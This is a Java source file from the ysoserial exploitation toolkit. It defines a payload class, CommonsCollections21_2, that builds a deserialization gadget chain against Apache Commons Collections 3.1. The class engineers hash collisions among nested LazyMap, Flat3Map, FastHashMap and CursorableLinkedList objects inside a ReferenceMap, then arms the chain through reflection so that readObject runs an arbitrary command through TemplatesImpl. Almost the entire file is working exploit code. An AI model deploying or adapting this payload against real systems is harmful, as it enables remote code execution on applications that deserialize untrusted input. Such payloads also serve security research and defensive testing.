package ysoserial.payloads;


import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.list.CursorableLinkedList;
import org.apache.commons.collections.map.ReferenceIdentityMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.Flat3Map;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.ReferenceMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import javax.xml.transform.Templates;
import java.util.*;


/*
	Cluster4_20220605-162453, first chain.
	Gadget chain:

        The chain is the code next line, but we changed ReferenceIdentityMap with ReferenceMap
        chain_ReferenceIdentityMap31-readObject-0b8ee023a0a2a936512729024521b4c5ca0c7660.txt
            [
         <org.apache.commons.collections.map.ReferenceMap: void readObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections.map.AbstractReferenceMap: void doReadObject(java.io.ObjectInputStream)>
         <org.apache.commons.collections.map.AbstractReferenceMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections.map.AbstractHashedMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections.map.AbstractHashedMap: boolean isEqualKey(java.lang.Object,java.lang.Object)>
         <org.apache.commons.collections.CursorableLinkedList: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.FastHashMap: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.map.Flat3Map: boolean equals(java.lang.Object)>
         <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
         <org.apache.commons.collections.functors.InvokerTransformer: java.lang.Object transform(java.lang.Object)>
         <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>
        ]
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections:3.1"})
@Authors({"BadagliaccaDaniele"})
public class CommonsCollections21_2 implements ObjectPayload<ReferenceMap> {

    public ReferenceMap getObject(final String command) throws Exception {

        Object templates = Gadgets.createTemplatesImpl(command);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[]{String.class};
        Object[] args = new Object[]{"foo"};
        InstantiateTransformer instantiate = new InstantiateTransformer(
            paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
        args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate});

        // mock method name until armed
        final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, chain);
        lazyMap1.put("yy", 1);
        System.out.println(lazyMap1.hashCode());
        Flat3Map flat3Map1 = new Flat3Map();
        flat3Map1.put(lazyMap1, 2);
        System.out.println(flat3Map1.hashCode());
        FastHashMap fastHashMap1 = new FastHashMap();
        fastHashMap1.put(flat3Map1, 3);
        System.out.println(fastHashMap1.hashCode());
        CursorableLinkedList cursorableLinkedList1 = new CursorableLinkedList();
        cursorableLinkedList1.add(fastHashMap1);
        System.out.println(cursorableLinkedList1.hashCode());

        Map lazyMap2 = LazyMap.decorate(innerMap2, chain);
        lazyMap2.put("zZ", 1);
        System.out.println(lazyMap2.hashCode());
        Flat3Map flat3Map2 = new Flat3Map();
        flat3Map2.put(lazyMap2, 2);
        System.out.println(flat3Map2.hashCode());
        FastHashMap fastHashMap2 = new FastHashMap();
        fastHashMap2.put(flat3Map2, 3);
        System.out.println(fastHashMap2.hashCode());
        CursorableLinkedList cursorableLinkedList2 = new CursorableLinkedList();
        cursorableLinkedList2.add(fastHashMap2);
        System.out.println(cursorableLinkedList2.hashCode());


        ReferenceMap referenceMap = new ReferenceMap();
        referenceMap.put(cursorableLinkedList1, 1);
        referenceMap.put(cursorableLinkedList2, 2);

        // Needed to ensure hash collision after previous manipulations
        lazyMap1.remove("zZ");

        // swap in values to arm
        Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        System.out.println(lazyMap1.hashCode());
        System.out.println(lazyMap2.hashCode());

        return referenceMap;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections21_2.class, args);
    }

}
